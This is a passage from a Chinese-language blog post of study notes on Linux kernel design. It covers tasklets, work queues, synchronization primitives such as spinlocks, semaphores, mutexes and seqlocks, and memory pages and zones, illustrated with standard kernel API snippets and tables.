</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DECLARE_TASKLET(my_tasklet, my_tasklet_handler, dev);</span><br></pre></td></tr></table></figure>
<p>等价于</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tasklet_struct</span> <span class="title">my_tasklet</span> =</span> &#123;<span class="literal">NULL</span>, <span class="number">0</span>, ATOMIC_INIT(<span class="number">0</span>),</span><br><span class="line">                                   	my_tasklet_handler, dev&#125;;</span><br></pre></td></tr></table></figure>
<p>​    动态声明</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">tasklet_init(t, tasklet_handler, dev);</span><br></pre></td></tr></table></figure>
<ol>
<li>编写自己的 tasklet 处理程序</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tasklet_handler</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> data)</span></span></span><br></pre></td></tr></table></figure>
<ol>
<li>调度自己的 tasklet</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">tasklet_schedule(&amp;my_tasklet);  <span class="comment">/* 把 my_tasklet 标记为挂起 */</span> </span><br></pre></td></tr></table></figure>
<h5 id="内核是如何处理软中断的？"><a href="#内核是如何处理软中断的？" class="headerlink" title="内核是如何处理软中断的？"></a>内核是如何处理软中断的？</h5><p>方案说明  </p>
<div class="table-container">
<table>
<thead>
<tr>
<th>方案</th>
<th>说明</th>
<th>优</th>
<th>缺</th>
</tr>
</thead>
<tbody>
<tr>
<td>一</td>
<td><strong>本次执行全部处理</strong>（只要还有被触发并等待处理的软中断，本次执行就要负责处理，重新触发的软中断也在本次执行返回前被处理）</td>
<td>可以<strong>即时</strong>处理内核的软中断</td>
<td>负载较高时，会有大量重复触发的软中断，用户空间的任务就会被忽略（<strong>用户空间处于饥饿状态</strong>）</td>
</tr>
<tr>
<td>二</td>
<td><strong>不处理重新触发的软中断</strong>（等下一个软中断执行去处理）</td>
<td>用户不饥饿了</td>
<td>软中断可能饥饿</td>
</tr>
<tr>
<td>三</td>
<td>折中。<br>1. 不立即处理重新触发的软中断<br>2. 大量软中断出现时，内核唤醒一组低优先级的内核线程来处理这些负载。</td>
<td>1. 负载高，用户也不会饥饿<br>2. 空闲时，软中断处理也很快</td>
</tr>
</tbody>
</table>
</div>
<h4 id="8-3-3-工作队列-work-queue"><a href="#8-3-3-工作队列-work-queue" class="headerlink" title="8.3.3 工作队列 work queue"></a>8.3.3 工作队列 work queue</h4><ol>
<li><p>特点</p>
<ul>
<li><p>靠内核线程实现</p>
</li>
<li><p>可以<font color="blue">将工作推后执行</font>，交由一个内核线程去执行</p>
</li>
<li><p>工作队列<font color="blue">允许重新调度，甚至睡眠</font></p>
</li>
</ul>
</li>
<li><p>怎么在工作队列和软中断/tasklet 中做选择？</p>
<ul>
<li><p>看推后执行的任务，<strong>是否需要睡眠</strong>。要睡眠就工作队列。</p>
</li>
<li><p><strong>是否需要重新调度</strong>，需要则工作队列</p>
</li>
</ul>
<p>如果不需要用一个内核线程来推后执行工作，就还是选 tasklet</p>
</li>
</ol>
<h2 id="第-9-章-内核同步介绍"><a href="#第-9-章-内核同步介绍" class="headerlink" title="第 9 章 - 内核同步介绍"></a>第 9 章 - 内核同步介绍</h2><ul>
<li><p>为什么要做内核同步？</p>
<p>防止共享资源并发访问。（并发访问，可能会发生各线程间相互覆盖共享数据的情况。这会导致系统不稳定，且问题不好定位）</p>
</li>
</ul>
<h3 id="9-1-临界区和竞争条件"><a href="#9-1-临界区和竞争条件" class="headerlink" title="9.1 临界区和竞争条件"></a>9.1 临界区和竞争条件</h3><ul>
<li><p>临界区：临界段，就是访问和操作共享数据的<strong>代码段</strong>。</p>
</li>
<li><p>竞争条件：两个线程在同一临界区同时执行，就存在竞争。</p>
</li>
</ul>
<script type="math/tex; mode=display">同步=避免并发+防止竞争条件</script><h3 id="9-2-锁机制"><a href="#9-2-锁机制" class="headerlink" title="9.2 锁机制"></a>9.2 锁机制</h3><ul>
<li>本质：给临界区加锁，保证临界区只存在一个执行线程。</li>
</ul>
<p><img src="/2021/06/28/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210706155926907.png" alt="image-20210706155926907" style="zoom:67%;"></p>
<ul>
<li><p>锁机制之间的主要区别</p>
<p>一些锁被争用时，就简单执行<strong>忙等待</strong>；另外一些锁会<strong>使当前任务睡眠</strong>直到锁可用。</p>
</li>
<li><p>造成并发执行的原因</p>
</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>竞争条件成因</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>中断</td>
<td>中断随时可能发生，可能随时打断正在执行的代码</td>
</tr>
<tr>
<td>软中断和 tasklet</td>
<td>内核能随时可能唤醒或调度软中断和 tasklet，也就随时可能打断正在执行的代码</td>
</tr>
<tr>
<td>内核抢占</td>
<td>内核具有抢占性，内核中的任务可能会被另一个任务抢占</td>
</tr>
<tr>
<td>睡眠及与用户空间的同步</td>
<td>在内核执行的进程可能会睡眠，这就会唤醒调度程序，从而导致调度一个新的用户进程执行</td>
</tr>
<tr>
<td>对称多处理</td>
<td>多个处理器同时执行代码</td>
</tr>
</tbody>
</table>
</div>
<h4 id="编写内核代码时需要考虑的问题"><a href="#编写内核代码时需要考虑的问题" class="headerlink" title="编写内核代码时需要考虑的问题"></a>编写内核代码时需要考虑的问题</h4><ol>
<li>这个数据是不是全局的？除了当前线程外，其他线程能不能访问它？</li>
<li>这个数据会不会在进程上下文和中断上下文中共享？它是不是要在两个不同的中断处理程序中共享？</li>
<li>进程在访问数据时有没有可能被抢占？被调度的新程序会不会访问同一数据？</li>
<li>当前进程会不会睡眠（阻塞）在某些资源上，如果会，它会让共享数据处于何种状态？</li>
<li>怎样防止数据失控？</li>
<li>如果这个函数又在另一个处理器上被调度将会发生什么？</li>
<li>如何确保代码远离并发威胁？</li>
</ol>
<h3 id="9-3-死锁"><a href="#9-3-死锁" class="headerlink" title="9.3 死锁"></a>9.3 死锁</h3><ul>
<li><p>发生死锁的原因</p>
<p>每个线程都在相互等待，但是所有资源都被占用了，它们也不释放已经占用的资源，导致任何线程都无法继续，因此产生死锁。</p>
</li>
</ul>
<h4 id="9-3-1-实例"><a href="#9-3-1-实例" class="headerlink" title="9.3.1 实例"></a>9.3.1 实例</h4><ul>
<li>最简单的死锁：<strong>自死锁</strong></li>
</ul>
<p>一个执行线程想获得自己已经拥有的锁，它就等待这个锁，但是自己又不会释放这个锁，最终导致死锁。</p>
<ul>
<li>常见的 ABBA 锁</li>
</ul>
<p><img src="/2021/06/28/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210706164827753.png" alt="image-20210706164827753" style="zoom: 50%;"></p>
<h4 id="9-3-2-如何避免死锁"><a href="#9-3-2-如何避免死锁" class="headerlink" title="9.3.2 如何避免死锁"></a>9.3.2 如何避免死锁</h4><ol>
<li><strong>按顺序加锁</strong>（最重要）</li>
<li>防止发生饥饿</li>
<li>不重复请求同一个锁</li>
<li>设计力求简单（越复杂的加锁方案越容易死锁）</li>
</ol>
<h3 id="9-4-加锁粒度"><a href="#9-4-加锁粒度" class="headerlink" title="9.4 加锁粒度"></a>9.4 加锁粒度</h3><ul>
<li><p>加锁机制发展到细粒度（fine-grained）加锁后，有什么好处？</p>
<p>Linux 从 2.0 版内核，刚加入对多处理器支持的时候，一个时刻只能有一个任务在内核中执行。2.2 版本加锁机制发展到细粒度加锁后，不再有这样的限制。</p>
</li>
<li><p>粒度的粗细，有什么影响？</p>
</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>加锁粒度</th>
<th>扩展性</th>
<th>复杂度</th>
<th>开销</th>
<th>加锁保护的数据规模</th>
</tr>
</thead>
<tbody>
<tr>
<td>粗</td>
<td>差</td>
<td>低</td>
<td>小</td>
<td>大</td>
</tr>
<tr>
<td>细</td>
<td>好</td>
<td>高</td>
<td>大</td>
<td>小</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>锁的争用：锁正被占用时，有其他线程试图获得该锁。</li>
</ul>
<h2 id="第-10-章-内核同步方法"><a href="#第-10-章-内核同步方法" class="headerlink" title="第 10 章 - 内核同步方法"></a>第 10 章 - 内核同步方法</h2><p>简单场景：临界区只有一个变量 - 原子操作</p>
<p>复杂场景 - 锁机制</p>
<h3 id="10-1-原子操作"><a href="#10-1-原子操作" class="headerlink" title="10.1 原子操作"></a>10.1 原子操作</h3><ul>
<li><p>原子操作可以保证指令以原子的方式执行（执行过程不被打断）。</p>
</li>
<li><p>原子操作通常是内联函数，往往通过内联汇编指令来实现。</p>
</li>
</ul>
<p>原子整数操作的声明在 <code>&lt;asm/atomic.h&gt;</code> 中。</p>
<p>原子位操作定义在 <code>&lt;asm/bitops.h&gt;</code> 中</p>
<h3 id="10-2-自旋锁"><a href="#10-2-自旋锁" class="headerlink" title="10.2 自旋锁"></a>10.2 自旋锁</h3><p>Linux 内核最常见的锁。  </p>
<h4 id="10-2-1-特点"><a href="#10-2-1-特点" class="headerlink" title="10.2.1 特点"></a>10.2.1 特点</h4><ol>
<li><p>自旋锁最多只能被一个可执行线程持有（如果一个执行线程试图获得一个被占用的自旋锁，该线程就会一直循环-旋转-等待锁重新可用）</p>
</li>
<li><p>一个被争用的自旋锁，会让<strong>请求它的线程在等待锁重新可用时自旋</strong>，特别浪费处理器时间，这是自旋锁的<strong>要点</strong>  </p>
<p>所以，自旋锁不应该被长时间持有。自旋锁的初衷就是：在短期内进行轻量级加锁。  </p>
</li>
</ol>
<h4 id="10-2-2-自旋锁方法"><a href="#10-2-2-自旋锁方法" class="headerlink" title="10.2.2 自旋锁方法"></a>10.2.2 自旋锁方法</h4><p>自旋锁与体系结构相关的代码定义在 <code>&lt;asm/spinlock.h&gt;</code> 中，接口定义在 <code>&lt;linux/spinlock.h&gt;</code> 中。</p>
<hr>
<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ol>
<li><p>自旋锁不能递归，否则自死锁</p>
</li>
<li><p>在中断处理程序中使用自旋锁时，一定要在获取锁之前，首先禁止本地（当前处理器的）中断（否则造成 ABBA 锁）</p>
<p>解释一下为什么会造成 ABBA 锁：中断处理程序试图获得这个已经被持有的锁，就会自旋，等待锁重新可用，但这个锁的持有者在中断处理程序执行完以前不可能运行，自然不会释放锁。</p>
</li>
</ol>
<hr>
<ul>
<li>自旋锁方法列表</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>spin_lock()</td>
<td>获取指定的自旋锁</td>
</tr>
<tr>
<td>spin_lock_irq()</td>
<td>禁止本地中断并获取指定的锁</td>
</tr>
<tr>
<td>spin_lock_irqsave()</td>
<td>保存本地中断的当前状态，禁止中断，获取指定的锁</td>
</tr>
<tr>
<td>spin_unlock()</td>
<td>释放指定的锁</td>
</tr>
<tr>
<td>spin_unlock_irq()</td>
<td>释放指定的锁，并激活本地中断</td>
</tr>
<tr>
<td>spin_lock_init()</td>
<td>动态初始化指定的 spinlock_t</td>
</tr>
<tr>
<td>spin_trylock()</td>
<td>试图获取指定的锁，未获取则返回非 0</td>
</tr>
<tr>
<td>spin_is_lock()</td>
<td>如果指定的锁当前正在被获取，则返回非 0</td>
</tr>
</tbody>
</table>
</div>
<h4 id="10-2-3-自旋锁与下半部的配合使用"><a href="#10-2-3-自旋锁与下半部的配合使用" class="headerlink" title="10.2.3 自旋锁与下半部的配合使用"></a>10.2.3 自旋锁与下半部的配合使用</h4><ol>
<li><p>因为下半部可以抢占进程上下文中的代码，所以<font color="blue">下半部和进程上下文共享数据时</font>，要保护进程上下文中的数据：<font color="blue">加锁并禁止下半部执行</font></p>
</li>
<li><p>中断处理程序可以抢占下半部，所以<font color="blue">中断处理程序和下半部共享数据时，在获取锁的同时还要禁止中断</font></p>
</li>
<li>同类的 tasklet 不可能同时运行，所以同类 tasklet 的共享数据不需要保护。但<font color="blue">不同类的 tasklet 共享时，访问下半部数据前要先获得一个普通的自旋锁</font> （这里不用禁止下半部，因为同一处理器不存在 tasklet 相互抢占的情况）</li>
<li><font color="blue">数据被软中断共享，必须加锁保护，但不必禁止下半部</font>（无论软中断是否同类型，因为同一处理器的软中断不会相互抢占）</li>
</ol>
<h3 id="10-3-读-写自旋锁"><a href="#10-3-读-写自旋锁" class="headerlink" title="10.3 读-写自旋锁"></a>10.3 读-写自旋锁</h3><p><strong>多个读任务可以并发持有读者锁，但用于写的锁只能被一个写任务持有</strong>。读锁被持有时，写操作只能等待；而读者可以继续成功占用锁。读/写锁也叫共享/排斥锁，或者并发/排斥锁。通常情况下，读锁和写锁位于完全分隔开的代码分支中。</p>
<ul>
<li>读-写锁方法  </li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>read_lock()</td>
<td>获得指定的读锁</td>
</tr>
<tr>
<td>read_lock_irq()</td>
<td>禁止本地中断并获得指定读锁</td>
</tr>
<tr>
<td>read_lock_irqsave()</td>
<td>存储本地中断的当前状态，禁止本地中断并获得指定读锁</td>
</tr>
<tr>
<td>read_unlock()</td>
<td>释放指定的读锁</td>
</tr>
<tr>
<td>read_unlock_irq()</td>
<td>释放指定的读锁，并激活本地中断</td>
</tr>
<tr>
<td>read_unlock_irqstore()</td>
<td>释放指定的读锁，并将本地中断恢复到指定的前状态</td>
</tr>
<tr>
<td>write_lock()</td>
<td>获得指定的写锁</td>
</tr>
<tr>
<td>write_lock_irq()</td>
<td>禁止本地中断并获得指定写锁</td>
</tr>
<tr>
<td>write_lock_irqsave()</td>
<td>存储本地中断的当前状态，禁止本地中断并获得指定写锁</td>
</tr>
<tr>
<td>write_unlock()</td>
<td>释放指定的写锁</td>
</tr>
<tr>
<td>write_unlock_irq()</td>
<td>释放指定的写锁，并激活本地中断</td>
</tr>
<tr>
<td>write_unlock_irqstore()</td>
<td>释放指定的写锁，并将本地中断恢复到指定的前状态</td>
</tr>
<tr>
<td>write_trylock()</td>
<td>试图获得指定的写锁；如果写锁不可用，返回非 0 值</td>
</tr>
<tr>
<td>rwlock_init()</td>
<td>初始化指定的 rwlock_t</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>自旋锁与信号量的<strong>使用场景</strong>有何不同？</li>
</ul>
<p>自旋锁：加锁时间不长，且代码不会睡眠（比如中断处理程序）</p>
<p>信号量：加锁时间很长，代码在持有锁时可能睡眠</p>
<h3 id="10-4-信号量"><a href="#10-4-信号量" class="headerlink" title="10.4 信号量"></a>10.4 信号量</h3><p>Linux 中的信号量是一种<font color="blue">睡眠锁</font>。原理：任务试图获得一个被占用的信号量，信号量将其推进一个等待序列并让其睡眠，这样处理器就可以空闲并执行其他代码，当那个信号量可用的时候，等待序列中的那个任务就会被唤醒并获得该信号量。</p>
<ul>
<li>自旋锁与信号量区别</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>锁</th>
<th>处理器利用率</th>
<th>开销</th>
</tr>
</thead>
<tbody>
<tr>
<td>自旋锁</td>
<td>低</td>
<td>小</td>
</tr>
<tr>
<td>信号量</td>
<td>高</td>
<td>大</td>
</tr>
</tbody>
</table>
</div>
<h4 id="10-4-1-信号量的分类"><a href="#10-4-1-信号量的分类" class="headerlink" title="10.4.1 信号量的分类"></a>10.4.1 信号量的分类</h4><p>信号量同时允许的持有者数量可以在声明信号量时指定，根据这个数量，可分为二值信号量和计数信号量。  </p>
<ul>
<li><p>二值信号量（也即互斥信号量）：只有 0 和 1 两种情况  </p>
</li>
<li><p>计数信号量：数量可以大于 1，也就是说，允许同一时刻允许多个持有者，也即允许多个执行线程同时访问临界区。</p>
</li>
</ul>
<font color="blue">内核使用信号量时，基本都是用互斥信号量</font>  

<h4 id="10-4-2-信号量的创建与使用"><a href="#10-4-2-信号量的创建与使用" class="headerlink" title="10.4.2 信号量的创建与使用"></a>10.4.2 信号量的创建与使用</h4><p>信号量的实现与体系结构相关，在 <code>&lt;asm/semaphore.h&gt;</code> 中。</p>
<h5 id="几种创建方法"><a href="#几种创建方法" class="headerlink" title="几种创建方法"></a>几种创建方法</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * name     - 信号量变量名</span></span><br><span class="line"><span class="comment"> * count    - 信号量的使用数量</span></span><br><span class="line"><span class="comment"> * sem      - 指向动态创建的信号量的间接指针</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// 静态声明计数信号量</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">semaphore</span> <span class="title">name</span>;</span></span><br><span class="line">sema_init(&amp;name, count);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 静态创建互斥信号量</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">DECLARE_MUTEX</span><span class="params">(name)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更常见的情况，信号量作为一个大数据结构的一部分，动态创建</span></span><br><span class="line">sema_init(sem, count);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 与上一条类似，初始化一个动态创建的互斥信号量</span></span><br><span class="line">init_MUTEX(sem);</span><br></pre></td></tr></table></figure>
<h5 id="常规使用方法"><a href="#常规使用方法" class="headerlink" title="常规使用方法"></a>常规使用方法</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 定义并声明一个信号量，名为 mr_sem，用于信号量计数 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">DECLARE_MUTEX</span><span class="params">(mr_sem)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 试图获取信号量 */</span></span><br><span class="line"><span class="keyword">if</span> (down_interruptible(&amp;mr_sem))</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 临界区... */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 释放给定的信号量 */</span></span><br><span class="line">up(&amp;mr_sem);</span><br></pre></td></tr></table></figure>
<ul>
<li>信号量方法列表</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>sema_init(struct semaphore *, int)</td>
<td>以指定的计数值初始化动态创建的信号量</td>
</tr>
<tr>
<td>init_MUTEX(struct semaphore *)</td>
<td>以计数值 1 初始化动态创建的信号量</td>
</tr>
<tr>
<td>init_MUTEX_LOCKED(struct semaphore *)</td>
<td>以计数值 0 初始化动态创建的信号量（初始为加锁状态）</td>
</tr>
<tr>
<td>down_interruptible(struct semaphore *)</td>
<td>试图获得指定的信号量，若被占用，则进入可中断睡眠状态</td>
</tr>
<tr>
<td>down(struct semaphore *)</td>
<td>试图获得指定的信号量，但是如果被占用，会进入不可中断睡眠</td>
</tr>
<tr>
<td>down_trylock(struct semaphore *)</td>
<td>试图获得指定的信号量，被占用，则返回非 0 值</td>
</tr>
<tr>
<td>up(struct semaphore *)</td>
<td>释放指定信号量，如果睡眠队列不空，则唤醒其中一个任务</td>
</tr>
</tbody>
</table>
</div>
<h3 id="10-5-读-写信号量"><a href="#10-5-读-写信号量" class="headerlink" title="10.5 读-写信号量"></a>10.5 读-写信号量</h3><p>读写信号量与信号量的关系类似读写自旋锁与自旋锁的关系。  </p>
<h4 id="10-5-1-读-写信号量的特点"><a href="#10-5-1-读-写信号量的特点" class="headerlink" title="10.5.1 读-写信号量的特点"></a>10.5.1 读-写信号量的特点</h4><ol>
<li><p><font color="blue">所有的读-写信号量都是互斥信号量</font>（当然只对写者互斥，不对读者）  </p>
</li>
<li><p>不会被信号打断</p>
</li>
<li>读-写信号量比读-写自旋锁多一种特有操作: <code>downgrade_write()</code> ，可以将动态获取的写锁转换成读锁  </li>
</ol>
<p>需要注意，除非代码中读和写可以清楚地分开，否则最好不使用。</p>
<h3 id="10-6-互斥体-mutex"><a href="#10-6-互斥体-mutex" class="headerlink" title="10.6 互斥体 mutex"></a>10.6 互斥体 mutex</h3><p>☞<font color="blue">任何可以睡眠的强制互斥锁</font>。mutex 的使用场景更严格  </p>
<ol>
<li>mutex 的使用计数永远是 1</li>
<li>需在同一个上下文加解锁</li>
<li>不允许递归上锁和解锁</li>
<li>持有 mutex 的进程不能退出</li>
<li>mutex 不能在中断或者下半部使用</li>
<li>mutex 只能通过官方 API 管理</li>
</ol>
<h4 id="Mutex-方法"><a href="#Mutex-方法" class="headerlink" title="Mutex 方法"></a>Mutex 方法</h4><div class="table-container">
<table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>mutex_lock(struct mutex *)</td>
<td>为指定的mutex上锁，如果锁不可用则睡眠</td>
</tr>
<tr>
<td>mutex_unlock(struct mutex *)</td>
<td>为指定的mutex解锁</td>
</tr>
<tr>
<td>mutex_trylock(struct mutex *)</td>
<td>试图获取指定的mutex，如果成功则返回1；否则锁被获取，返回0</td>
</tr>
<tr>
<td>mutex_is_locked(struct mutex *)</td>
<td>如果锁已被争用，则返回1；否则返回0</td>
</tr>
</tbody>
</table>
</div>
<h4 id="10-6-1-信号量与互斥体怎么选？"><a href="#10-6-1-信号量与互斥体怎么选？" class="headerlink" title="10.6.1 信号量与互斥体怎么选？"></a>10.6.1 信号量与互斥体怎么选？</h4><p>优先使用 mutex，如果不能满足某些约束条件，再考虑信号量</p>
<h4 id="10-6-2-自旋锁与互斥体怎么选？"><a href="#10-6-2-自旋锁与互斥体怎么选？" class="headerlink" title="10.6.2 自旋锁与互斥体怎么选？"></a>10.6.2 自旋锁与互斥体怎么选？</h4><div class="table-container">
<table>
<thead>
<tr>
<th>需求</th>
<th>加锁方法</th>
</tr>
</thead>
<tbody>
<tr>
<td>低开销加锁</td>
<td>优先自旋锁</td>
</tr>
<tr>
<td>短期锁定</td>
<td>优先自旋锁</td>
</tr>
<tr>
<td>中断上下文加锁</td>
<td>只能自旋锁</td>
</tr>
<tr>
<td>长期加锁</td>
<td>优先互斥体</td>
</tr>
<tr>
<td>持有锁需要睡眠</td>
<td>只能互斥体</td>
</tr>
</tbody>
</table>
</div>
<h3 id="10-7-完成变量"><a href="#10-7-完成变量" class="headerlink" title="10.7 完成变量"></a>10.7 完成变量</h3><p>completion variable，提供了代替信号量的一种简单方法。如果在内核中一个任务需要发出信号通知另一个任务发生了某个特定事件，<strong>完成变量</strong>是使两个任务同步的简单方法。  </p>
<p>完成变量由 completion 结构表示，定义在 <code>&lt;linux/completion.h&gt;</code> 中，完成变量方法有：  </p>
<div class="table-container">
<table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>init_completion(struct completion *)</td>
<td>初始化指定的动态创建的完成变量</td>
</tr>
<tr>
<td>wait_for_completion(struct completion *)</td>
<td>等待指定的完成变量接受信号</td>
</tr>
<tr>
<td>complete(struct completion *)</td>
<td>发信号唤醒任何等待任务</td>
</tr>
</tbody>
</table>
</div>
<p>使用完成变量的例子可以参考 <code>kernel/sched.c</code> 和 <code>kernel/fork.c</code></p>
<h3 id="10-8-BLK-大内核锁"><a href="#10-8-BLK-大内核锁" class="headerlink" title="10.8 BLK 大内核锁"></a>10.8 BLK 大内核锁</h3><p>是一个全局自旋锁，它的目的是实现从最初的 Linux SMP 过渡到细粒度加锁机制。但是目前它已经成为内核可扩展性的障碍，所有新代码中不再使用 BLK 了。</p>
<h3 id="10-9-顺序锁"><a href="#10-9-顺序锁" class="headerlink" title="10.9 顺序锁"></a>10.9 顺序锁</h3><p>seq 锁，为读写共享数据提供了一种简单机制。主要靠一个序列计数器实现。当有疑义的数据被写入，会得到一个锁，并且序列值增加。读取数据之前和之后，序列号都会被读取。  </p>
<ul>
<li>如果读取的序列值相同，说明读操作没有被写操作打断过。  </li>
<li>如果读取的是偶数，说明，写操作没有发生。（因为锁的初始值是 0，写锁会让锁变成奇数，释放的时候变成偶数）  </li>
</ul>
<h4 id="10-9-1-顺序锁的理想使用场景"><a href="#10-9-1-顺序锁的理想使用场景" class="headerlink" title="10.9.1 顺序锁的理想使用场景"></a>10.9.1 顺序锁的理想使用场景</h4><ol>
<li>数据存在很多读者</li>
<li>数据写者很少</li>
<li>写优先于读，且读者不能让写者饥饿</li>
<li>数据很简单，甚至是简单的整型</li>
</ol>
<h3 id="10-10-禁止抢占"><a href="#10-10-禁止抢占" class="headerlink" title="10.10 禁止抢占"></a>10.10 禁止抢占</h3><p>内核是抢占性的，所以一个任务与被抢占的任务可能会在同一个临界区内运行。为了避免这种情况，内核抢占代码使用自旋锁作为非抢占区域的标记，如果一个自旋锁被持有，内核就不能进行抢占。内核抢占相关函数：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>函数</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>preempt_disable()</td>
<td>增加抢占计数值，从而禁止内核抢占</td>
</tr>
<tr>
<td>preempt_enable()</td>
<td>减少抢占计数值，并当该值降为 0 时检查和执行被挂起的需调度的任务</td>
</tr>
<tr>
<td>preempt_enable_no_resched()</td>
<td>激活内核抢占但不再检查任何被挂起的需调度任务</td>
</tr>
<tr>
<td>preempt_count()</td>
<td>返回抢占计数</td>
</tr>
</tbody>
</table>
</div>
<h3 id="10-11-顺序与屏障"><a href="#10-11-顺序与屏障" class="headerlink" title="10.11 顺序与屏障"></a>10.11 顺序与屏障</h3><h4 id="10-11-1-顺序存在的意义"><a href="#10-11-1-顺序存在的意义" class="headerlink" title="10.11.1 顺序存在的意义"></a>10.11.1 顺序存在的意义</h4><p>处理多处理器或硬件设备的同步问题时，需要以一定的顺序进行读写操作。所有可能重新排序或写的处理器提供了机器指令来确保顺序要求，这些<strong>确保顺序</strong>的指令称作<strong>屏障</strong>。</p>
<h2 id="第-11-章-定时器和时间管理"><a href="#第-11-章-定时器和时间管理" class="headerlink" title="第 11 章 - 定时器和时间管理"></a>第 11 章 - 定时器和时间管理</h2><h2 id="第-12-章-内存管理"><a href="#第-12-章-内存管理" class="headerlink" title="第 12 章 - 内存管理"></a>第 12 章 - 内存管理</h2><h3 id="12-1-页"><a href="#12-1-页" class="headerlink" title="12.1 页"></a>12.1 页</h3><p><font color="blue">物理页是内存管理的基本单位。</font>大多 32 位体系结构支持 4 KB 的页，64 位支持 8 KB 的页。</p>
<ul>
<li><p>为什么处理器最小可寻址单位是字节，但内存管理基本单位却是页？</p>
<p>因为内存管理单元 MMU 通常以页为单位进行处理。（MMU ：管理内存并将虚拟地址转化为物理地址的硬件）所以从虚拟内存的角度看，页是最小单位。</p>
</li>
<li><p>页的结构体表示位于 <code>&lt;linux/mm_types.h&gt;</code> 中</p>
</li>
<li><p>页会消耗多少内存？</p>
<p>一 struct page 按 40 字节（根据具体结构体占位计算）算，假设系统的物理页大小为 8 KB，系统有 4 GB 物理内存，那么系统中共有页面  </p>
<script type="math/tex; mode=display">\frac{4\times 1024\times 1024\ KB}{8\ KB} = 524288个</script><p>而描述这么多页面的 page 结构体消耗的内存只不过 20 MB，代价不算太高。  </p>
</li>
</ul>
<h3 id="12-2-区"><a href="#12-2-区" class="headerlink" title="12.2 区"></a>12.2 区</h3><p> 页可以划分为不同的区（zone），这么划分的原因：有些页位于内存中特定的物理地址上，所以不能将其用于一些特定的任务。  </p>
<h4 id="12-2-2-Linux-中由于硬件缺陷而引起的内存寻址问题"><a href="#12-2-2-Linux-中由于硬件缺陷而引起的内存寻址问题" class="headerlink" title="12.2.2 Linux 中由于硬件缺陷而引起的内存寻址问题"></a>12.2.2 Linux 中由于硬件缺陷而引起的内存寻址问题</h4><ol>
<li>某些硬件只能用特定内存地址访问 DMA（直接内存访问）</li>
<li>一些体系结构的内存的物理寻址范围比虚拟寻址范围大得多。所以有一些内存不能永久映射到内核空间。</li>
</ol>
<h4 id="12-2-3-Linux-中主要使用的区"><a href="#12-2-3-Linux-中主要使用的区" class="headerlink" title="12.2.3 Linux 中主要使用的区"></a>12.2.3 Linux 中主要使用的区</h4><div class="table-container">
<table>
<thead>
<tr>
<th>区</th>
<th>描述</th>
<th>物理内存</th>
</tr>
</thead>
<tbody>
<tr>
<td>ZONE_DMA</td>
<td>DMA 使用的页</td>
<td>$&lt;16\ MB$</td>
</tr>
<tr>
<td>ZONE_NORMAL</td>
<td>正常可寻址的页</td>
<td>$16\sim896\ MB$</td>
</tr>
<tr>
<td>ZONE_HIGHMEM(所在内存时高端内存)</td>
<td>动态映射的页</td>
<td>$&gt;896\ MB$</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>ZONE_HIGHMEM 区中的页并不能永久映射到内核地址空间</li>
</ul>
<h3 id="12-3-低级页分配方法"><a href="#12-3-低级页分配方法" class="headerlink" title="12.3 低级页分配方法"></a>12.3 低级页分配方法</h3><p>具体可以参考 <code>&lt;linux/gfp.h&gt;</code>  </p>
<div class="table-container">
<table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>alloc_page(gfp_mask)</td>
<td>只分配一页，返回指向页结构的指针</td>
</tr>
<tr>
<td>alloc_pages(gfp_mask, order)</td>
<td>分配$2^{order}$个页，返回指向第一页页结构的指针</td>
</tr>
<tr>
<td>__get_free_page(gfp_mask)</td>
<td>只分配一页，返回指向其逻辑地址的指针</td>
</tr>
<tr>
<td>__get_free_pages(gfp_mask, order)</td>
<td>分配$2^{order}$页，返回指向第一页逻辑地址的指针</td>
</tr>
<tr>
<td>get_zeroed_page(gfp_mask)</td>
